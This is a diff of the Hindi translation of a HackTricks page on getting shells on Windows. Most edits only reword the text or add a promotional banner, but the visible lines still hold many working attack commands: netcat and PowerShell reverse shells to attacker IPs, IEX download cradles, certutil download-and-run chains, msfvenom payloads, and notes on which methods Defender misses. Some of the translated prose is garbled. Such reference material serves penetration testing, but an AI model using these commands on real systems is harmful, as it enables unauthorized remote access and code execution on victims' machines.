@@ -6,18 +6,26 @@
 
 HackTricks का समर्थन करने के अन्य तरीके:
 
-* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
-* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
+* अगर आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
+* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
 * हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
-* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
-* **हैकिंग ट्रिक्स साझा करें और PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।
+* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) और हमें **ट्विटर** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
+* **हैकिंग ट्रिक्स साझा करें और PRs सबमिट करें** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।
 
 </details>
 
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
+
 ## Lolbas
 
-पृष्ठ [lolbas-project.github.io](https://lolbas-project.github.io/) Windows के लिए है जैसे [https://gtfobins.github.io/](https://gtfobins.github.io/) लिनक्स के लिए है।\
-स्वाभाविक रूप से, **Windows में SUID फ़ाइलें या सुडो विशेषाधिकार नहीं हैं**, लेकिन यह उपयोगी है जानने के लिए **कि** कुछ **बाइनरी** कैसे (अप)उपयोग किए जा सकते हैं कुछ प्रकार की अप्रत्याशित क्रियाएँ करने के लिए **कोड को निष्पादित करें।**
+पृष्ठ [lolbas-project.github.io](https://lolbas-project.github.io/) विंडोज के लिए है जैसे [https://gtfobins.github.io/](https://gtfobins.github.io/) लिनक्स के लिए है।\
+स्वाभाविक रूप से, **विंडोज में SUID फ़ाइलें या सुडो विशेषाधिकार नहीं हैं**, लेकिन यह उपयोगी है जानने के लिए **कैसे** कुछ **बाइनरी** (अ)दुरुपयोग किया जा सकता है कुछ अप्रत्याशित क्रियाएँ करने के लिए जैसे **कोड का अभिव्यक्ति करें।**
 
 ## NC
 ```bash
@@ -25,7 +33,7 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) एक पोर्टेबल और सुरक्षित Netcat विकल्प है**। यह Unix जैसे सिस्टम और Win32 पर काम करता है। मजबूत एन्क्रिप्शन, प्रोग्राम निष्पादन, अनुकूलनीय स्रोत पोर्ट, और निरंतर पुनर्संधि जैसी विशेषताओं के साथ, sbd TCP/IP संचार के लिए एक बहुमुखी समाधान प्रदान करता है। Windows उपयोगकर्ताओं के लिए, Kali Linux वितरण से sbd.exe संस्करण को Netcat के लिए एक विश्वसनीय प्रतिस्थापन के रूप में उपयोग किया जा सकता है।
+**[sbd](https://www.kali.org/tools/sbd/) एक पोर्टेबल और सुरक्षित Netcat विकल्प है**। यह Unix जैसे सिस्टम और Win32 पर काम करता है। मजबूत एन्क्रिप्शन, प्रोग्राम निष्पादन, अनुकूलनीय स्रोत पोर्ट, और निरंतर पुनर्संबंधन जैसी विशेषताओं के साथ, sbd TCP/IP संचार के लिए एक बहुमुखी समाधान प्रदान करता है। Windows उपयोगकर्ताओं के लिए, Kali Linux वितरण से sbd.exe संस्करण को Netcat के लिए एक विश्वसनीय प्रतिस्थापन के रूप में उपयोग किया जा सकता है।
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -58,7 +66,7 @@ lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket")
 ```
 ## OpenSSH
 
-हम एक नए विंडोज शेल के लिए एक नया सत्र खोलेंगे। इसके लिए हम एक नए टर्मिनल विंडो खोलेंगे और उसमें निम्नलिखित कमांड दर्ज करेंगे:
+हम एक नए विंडोज शेल के लिए एक नए सत्र खोलेंगे। इसके लिए, हम एक नए सत्र खोलने के लिए निम्नलिखित कमांड का उपयोग करेंगे:
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
@@ -81,15 +89,13 @@ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000
 Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
-नेटवर्क कॉल करने वाली प्रक्रिया: **powershell.exe**\
-डिस्क पर लिखी गई पेलोड: **नहीं** (_कम से कम जहां मैंने procmon का उपयोग करके खोजा है!_)
+जाल कॉल करने वाली प्रक्रिया: **powershell.exe**\
+डिस्क पर लिखी गई पेलोड: **नहीं** (_कम से कम जहां तक मुझे प्रोसेस मॉनिटरिंग करते समय मिला है!_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
 **नेटवर्क कॉल करने वाली प्रक्रिया:** **svchost.exe**\
-**डिस्क पर लिखी गई पेलोड:** **WebDAV client local cache**
-
-**एक लाइनर:**
+**डिस्क पर लिखा गया पेलोड:** **WebDAV क्लाइंट स्थानीय कैश**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
@@ -165,7 +171,7 @@ Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given
 
 ## **Rundll32**
 
-[**Dll hello world example**](https://github.com/carterjones/hello-world-dll)
+[**Dll हैलो वर्ल्ड उदाहरण**](https://github.com/carterjones/hello-world-dll)
 
 * [यहाँ से](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
@@ -200,7 +206,7 @@ use windows/smb/smb_delivery
 run
 #You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
 ```
-**Rundll32 - कोडिक**
+**Rundll32 - Koadic**
 ```bash
 use stager/js/rundll32_js
 set SRVHOST 192.168.1.107
@@ -259,7 +265,7 @@ run
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
 ```
-एक B64exe डाउनलोड करें, उसे डीकोड करें और इसे चलाएं।
+एक B64exe डाउनलोड करें, इसे डीकोड करें और इसे चलाएं।
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
@@ -276,12 +282,12 @@ msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > sh
 ```
 **डिफेंडर द्वारा पहचाना गया**
 
-## पीएस-बैट
+## PS-Bat
 ```bash
 \\webdavserver\folder\batchfile.bat
 ```
-नेटवर्क कॉल करने वाली प्रक्रिया: **svchost.exe**\
-डिस्क पर लिखी गई पेलोड: **WebDAV क्लाइंट स्थानीय कैश**
+जांच करने वाली प्रक्रिया: **svchost.exe**\
+डिस्क पर लिखी गई पेलोड: **WebDAV client local cache**
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
 impacket-smbserver -smb2support kali `pwd`
@@ -294,7 +300,7 @@ impacket-smbserver -smb2support kali `pwd`
 
 ## **MSIExec**
 
-हमलावार
+हमलावर
 ```
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
 python -m SimpleHTTPServer 80
@@ -325,7 +331,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 **नहीं पहचाना गया**
 
-**आप बहुत आसानी से एक Koadic zombie को डाउनलोड और एक्जीक्यूट कर सकते हैं उसिंग स्टेजर wmic**
+**आप बहुत आसानी से एक Koadic zombie डाउनलोड और एक्जीक्यूट कर सकते हैं उसिंग स्टेजर wmic**
 
 ## Msbuild
 
@@ -333,16 +339,16 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-आप इस तकनीक का उपयोग एप्लिकेशन व्हाइटलिस्टिंग और Powershell.exe प्रतिबंधों को अनदेखा करने के लिए कर सकते हैं। जैसा कि आपको एक PS शैल के साथ प्रॉम्प्ट किया जाएगा।\
+आप इस तकनीक का उपयोग ऐप्लिकेशन व्हाइटलिस्टिंग और Powershell.exe प्रतिबंधों को अनदेखा करने के लिए कर सकते हैं। जैसे ही आपको एक PS शैल मिलेगा।\
 बस इसे डाउनलोड करें और इसे निष्पादित करें: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 ```
 **नहीं पहचाना**
 
-## **सीएससी**
+## **CSC**
 
-विक्टिम मशीन में सीशार्प कोड कॉम्पाइल करें।
+विक्टिम मशीन में C# कोड कंपाइल करें।
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
@@ -380,7 +386,7 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-एक वेब सर्वर में स्क्रिप्ट सर्व करना शुरू करें और पीड़ित के अंत में इसे क्रियान्वित करें:
+एक वेब सर्वर में स्क्रिप्ट सर्व करना शुरू करें और पीड़ित के अंत में इसे निष्पादित करें:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
@@ -396,11 +402,11 @@ Defender इसे दुष्ट कोड के रूप में नह�
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender इसे दुष्ट कोड के रूप में नहीं पहचानता है (अभी तक, 3/04/2019).
+**डिफेंडर इसे दुष्ट कोड के रूप में नहीं पहचानता है (अभी तक, 3/04/2019).**
 
-**powercat द्वारा प्रस्तावित अन्य विकल्प:**
+**पावरकैट द्वारा प्रस्तावित अन्य विकल्प:**
 
-बाइंड शैल, रिवर्स शैल (TCP, UDP, DNS), पोर्ट रीडायरेक्ट, अपलोड/डाउनलोड, पेलोड उत्पन्न करें, फ़ाइल सर्व करें...
+बाइंड शैल, रिवर्स शैल (TCP, UDP, DNS), पोर्ट पुनर्निर्देशन, अपलोड/डाउनलोड, पेलोड उत्पन्न करें, फ़ाइल सर्व करें...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -443,11 +449,11 @@ msfconsole -r unicorn.rc
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
-**मालिक को दुर्गंधित कोड के रूप में पहचाना गया**
+**मालिकाना कोड के रूप में पहचाना गया**
 
 ## अधिक
 
-[PS>Attack](https://github.com/jaredhaight/PSAttack) PS कंसोल जिसमें कुछ आक्रामक PS मॉड्यूल पूर्व-लोड हैं (साइफर्ड)\
+[PS>Attack](https://github.com/jaredhaight/PSAttack) PS कंसोल जिसमें कुछ आक्रामक PS मॉड्यूल पूर्वालोड हैं (साइफर्ड)\
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
 WinPWN](https://github.com/SecureThisShit/WinPwn) PS कंसोल जिसमें कुछ आक्रामक PS मॉड्यूल और प्रॉक्सी पहचान है (IEX)
 
@@ -461,16 +467,22 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS कंसोल जिस�
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 * [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ​
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
 <details>
 
-<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>
+<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-HackTricks का समर्थन करने के अन्य तरीके:
+Other ways to support HackTricks:
 
-* यदि आप अपनी कंपनी का विज्ञापन HackTricks में देखना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
-* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
-* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
-* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
-* **हैकिंग ट्रिक्स साझा करें** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके।
+* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
